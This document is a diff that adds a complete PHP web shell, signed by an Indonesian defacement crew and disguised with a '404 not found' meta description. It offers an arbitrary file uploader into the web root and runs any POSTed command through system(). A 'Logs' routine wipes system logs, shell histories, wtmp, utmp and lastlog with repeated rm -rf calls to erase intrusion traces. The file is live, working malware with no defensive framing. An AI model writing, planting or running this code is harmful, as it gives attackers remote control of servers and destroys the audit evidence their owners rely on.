@@ -1,0 +1,199 @@
+<?
+// Shell By : HT45TP | CY#B3R0NE
+// THANKS     : CY#B3R0NE 
+// GARUDA TERSAKTI 72><Dark Side Team
+?>
+<?php
+error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
+echo "<html>
+  <head>
+  	<title>root@gans:~#</title>
+  <meta name='Author' content='CY#B3R0NE | HT45TP'/>
+  <meta name='Keywords' content='Uploader By, Priv8 Uploader By, Mini Shell By, Priv8 Home Root Uploader,'>
+  <meta name='description' content='404 not found'/>
+  <meta name='robots' content='noindex,nofollow'/>
+ </head>
+	 <body>";
+	echo "<font size='4'><b>HT45TP | CY#B3R0NE</br></b></font></br>";
+	echo "#Host: <b>".$_SERVER['HTTP_HOST']."</b><br>";
+	echo "#System: <b>".php_uname()."</b><br>";
+	echo "<br><form method='GET'>
+<font style='text-decoration: underline;'>".$_SERVER['HTTP_HOST']."@".$_SERVER['REMOTE_ADDR'].": ~ $ </font>
+	<input type='text' size='30' height='10' name='cmd'><input type='submit' value='>>'>
+	</form>";
+	if($_GET['cmd'] == 'R'){
+	echo "<form method='post' enctype='multipart/form-data'>
+	  <input type='file' name='idx_file'>
+	  <input type='submit' name='upload' value='upload'>
+	  </form>";
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['idx_file']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+	if(is_writable($root)) {
+		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "sukses upload cok^_^ -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+		} else {
+			echo "gagal upload di document root.";
+		}
+	} else {
+		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+			echo "sukses upload cok^_^ <b>$files</b> di folder ini";
+		} else {
+			echo "gagal upload cok";
+		}
+	}
+}
+	}
+	elseif($_GET['cmd'] == 'Logs') {
+    echo '<br><center><b><span>Delete Logs ( biar aman goblok )</span></b><center><br>';
+    echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
+    exec("rm -rf /tmp/logs");
+    exec("rm -rf /root/.ksh_history");
+    exec("rm -rf /root/.bash_history");
+    exec("rm -rf /root/.bash_logout");
+    exec("rm -rf /usr/local/apache/logs");
+    exec("rm -rf /usr/local/apache/log");
+    exec("rm -rf /var/apache/logs");
+    exec("rm -rf /var/apache/log");
+    exec("rm -rf /var/run/utmp");
+    exec("rm -rf /var/logs");
+    exec("rm -rf /var/log");
+    exec("rm -rf /var/adm");
+    exec("rm -rf /etc/wtmp");
+    exec("rm -rf /etc/utmp");
+    exec("rm -rf $HISTFILE");
+    exec("rm -rf /var/log/lastlog");
+    exec("rm -rf /var/log/wtmp");
+ 
+    shell_exec("rm -rf /tmp/logs");
+    shell_exec("rm -rf /root/.ksh_history");
+    shell_exec("rm -rf /root/.bash_history");
+    shell_exec("rm -rf /root/.bash_logout");
+    shell_exec("rm -rf /usr/local/apache/logs");
+    shell_exec("rm -rf /usr/local/apache/log");
+    shell_exec("rm -rf /var/apache/logs");
+    shell_exec("rm -rf /var/apache/log");
+    shell_exec("rm -rf /var/run/utmp");
+    shell_exec("rm -rf /var/logs");
+    shell_exec("rm -rf /var/log");
+    shell_exec("rm -rf /var/adm");
+    shell_exec("rm -rf /etc/wtmp");
+    shell_exec("rm -rf /etc/utmp");
+    shell_exec("rm -rf $HISTFILE");
+    shell_exec("rm -rf /var/log/lastlog");
+    shell_exec("rm -rf /var/log/wtmp");
+ 
+    passthru("rm -rf /tmp/logs");
+    passthru("rm -rf /root/.ksh_history");
+    passthru("rm -rf /root/.bash_history");
+    passthru("rm -rf /root/.bash_logout");
+    passthru("rm -rf /usr/local/apache/logs");
+    passthru("rm -rf /usr/local/apache/log");
+    passthru("rm -rf /var/apache/logs");
+    passthru("rm -rf /var/apache/log");
+    passthru("rm -rf /var/run/utmp");
+    passthru("rm -rf /var/logs");
+    passthru("rm -rf /var/log");
+    passthru("rm -rf /var/adm");
+    passthru("rm -rf /etc/wtmp");
+    passthru("rm -rf /etc/utmp");
+    passthru("rm -rf $HISTFILE");
+    passthru("rm -rf /var/log/lastlog");
+    passthru("rm -rf /var/log/wtmp");
+ 
+ 
+    system("rm -rf /tmp/logs");
+    sleep(2);
+    echo'<br>Deleting .../tmp/logs ';
+    sleep(2);
+ 
+    system("rm -rf /root/.bash_history");
+    sleep(2);
+    echo'<p>Deleting .../root/.bash_history </p>';
+ 
+    system("rm -rf /root/.ksh_history");
+    sleep(2);
+    echo'<p>Deleting .../root/.ksh_history </p>';
+ 
+    system("rm -rf /root/.bash_logout");
+    sleep(2);
+    echo'<p>Deleting .../root/.bash_logout </p>';
+ 
+    system("rm -rf /usr/local/apache/logs");
+    sleep(2);
+    echo'<p>Deleting .../usr/local/apache/logs </p>';
+ 
+    system("rm -rf /usr/local/apache/log");
+    sleep(2);
+    echo'<p>Deleting .../usr/local/apache/log </p>';
+ 
+    system("rm -rf /var/apache/logs");
+    sleep(2);
+    echo'<p>Deleting .../var/apache/logs </p>';
+ 
+    system("rm -rf /var/apache/log");
+    sleep(2);
+    echo'<p>Deleting .../var/apache/log </p>';
+ 
+    system("rm -rf /var/run/utmp");
+    sleep(2);
+    echo'<p>Deleting .../var/run/utmp </p>';
+ 
+    system("rm -rf /var/logs");
+    sleep(2);
+    echo'<p>Deleting .../var/logs </p>';
+ 
+    system("rm -rf /var/log");
+    sleep(2);
+    echo'<p>Deleting .../var/log </p>';
+ 
+    system("rm -rf /var/adm");
+    sleep(2);
+    echo'<p>Deleting .../var/adm </p>';
+ 
+    system("rm -rf /etc/wtmp");
+    sleep(2);
+    echo'<p>Deleting .../etc/wtmp </p>';
+ 
+    system("rm -rf /etc/utmp");
+    sleep(2);
+    echo'<p>Deleting .../etc/utmp </p>';
+ 
+    system("rm -rf $HISTFILE");
+    sleep(2);
+    echo'<p>Deleting ...$HISTFILE </p>';
+ 
+    system("rm -rf /var/log/lastlog");
+    sleep(2);
+    echo'<p>Deleting .../var/log/lastlog </p>';
+ 
+    system("rm -rf /var/log/wtmp");
+    sleep(2);
+    echo'<p>Deleting .../var/log/wtmp </p>';
+ 
+    sleep(4);
+ 
+    echo '<br><br><p>Sukses Ngilangin jejak^_^';
+    echo"</td></tr></table>";
+    }
+	elseif($_GET['cmd'] == 'about'){
+	echo '<font color="black" size="4"><b>PRIV8 UPLOADER BY HT45TP | CY#B3R0NE</b></font>';
+	}
+	elseif($_GET['cmd'] == 'upload'){
+	echo '<font color="purple" size="4"><b>hilih Ngapain?</b></font>';
+	}
+	elseif($_GET['cmd'] == 'uploader'){
+	echo '<font color="red" size="4"><b>salah goblok malah diterusin mau nikung ya</b></font>';
+	}
+	elseif($_GET['cmd'] == 'ls'){
+	echo '<font color="black" size="4"><b>hmm sudah kuduga</b></font>';
+	}
+	elseif($_GET['cmd'] == 'Readme'){
+	echo '<font color="black" size="5"><br>•Y For Uploader<br><b>Special Thanks To<marquee>+Tersakti72•Dark Side Team</marquee></b></font>';
+	}
+	if(isset($_POST['cmd']) && $_POST['cmd']!=''){
+   system($_POST['cmd'].' 2>&1');
+}
+  echo "</body></html>";
